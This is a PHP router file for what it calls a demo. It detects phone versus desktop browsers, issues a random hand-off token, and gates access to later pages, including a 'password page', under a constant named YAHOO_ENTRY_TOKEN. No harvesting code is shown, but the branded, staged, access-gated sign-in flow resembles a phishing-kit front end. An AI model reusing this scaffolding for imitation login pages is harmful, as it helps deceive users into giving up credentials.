<?php
/**
 * Device-aware entry point and the only front door for the demo.
 *
 * Inspects the User-Agent header and forwards the visitor to the page
 * that matches their device:
 *
 *   Desktop/laptop -> indexx.php
 *   Phones/tablets -> indexmob.php
 *
 * Access control
 * --------------
 * Step 1 (this file): mints a random hand-off token and sends the
 * browser to the chosen entry page as `?e=<token>`. If the visitor
 * already carries a well-formed token (pressing Back, for example),
 * the entry page is included directly instead of redirecting again.
 *
 * Step 2 (indexx.php / indexmob.php): only render when they were
 * reached through us. Anything else goes back to index.php.
 *
 * Step 3 (index2.php / index2mob.php): only render when the token is
 * handed back by the matching step-2 page. index2.php accepts only a
 * 'd' (desktop) token and index2mob.php only an 'm' (mobile) one, so a
 * mobile hand-off cannot open the desktop password page, or vice versa.
 *
 * Note: User-Agent sniffing is heuristic. For anything real, pair this
 * with a client-side check or use responsive design.
 */

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

// Allow-list of mobile/tablet markers. Tablets like iPad and
// Android tablets should land on the mobile page. Desktop is the
// default so unusual UAs still get a sensible destination.
$mobileMarkers = array(
    'Mobile',           // generic mobile catch-all (Android, etc.)
    'Android',          // covers phones; Android tablets also match here
    'iPhone',
    'iPad',
    'iPod',
    'BlackBerry',
    'IEMobile',
    'Opera Mini',
    'Opera Mobi',
    'webOS',
    'Windows Phone',
    'Kindle',
    'Silk',             // Kindle Fire + Amazon Silk
    'PlayBook',
    'BB10',
    'Symbian',
    'MeeGo',
    'Fennec',
);

$isMobile = false;
foreach ($mobileMarkers as $needle) {
    if (stripos($ua, $needle) !== false) {
        $isMobile = true;
        break;
    }
}

$target = $isMobile ? 'indexmob.php' : 'indexx.php';

// A token is a flow marker ('d' or 'm') plus 32 lowercase hex characters
// (16 random bytes). The leading letter says which entry page handed the
// token out, so index2.php only accepts desktop tokens and index2mob.php
// only accepts mobile ones. The same shape is re-checked by every guarded
// page.
$flow   = $isMobile ? 'm' : 'd';
$prefix = $flow . '[a-f0-9]{32}';
$token  = isset($_GET['e']) ? (string) $_GET['e'] : '';

if (!preg_match('/^' . $prefix . '$/', $token)) {
    // Mint a fresh token for this flow. Hand off with a real redirect so
    // the address bar shows the entry page rather than this router. The
    // token rides along as ?e=.
    $token = $flow . bin2hex(random_bytes(16));
    header('Location: ' . $target . '?e=' . $token, true, 302);
    exit;
}

// Valid token in hand: serve the entry page inside this request, so
// the constant below is defined before the entry page is parsed.
define('YAHOO_ENTRY_TOKEN', $token);

require __DIR__ . DIRECTORY_SEPARATOR . $target;
exit;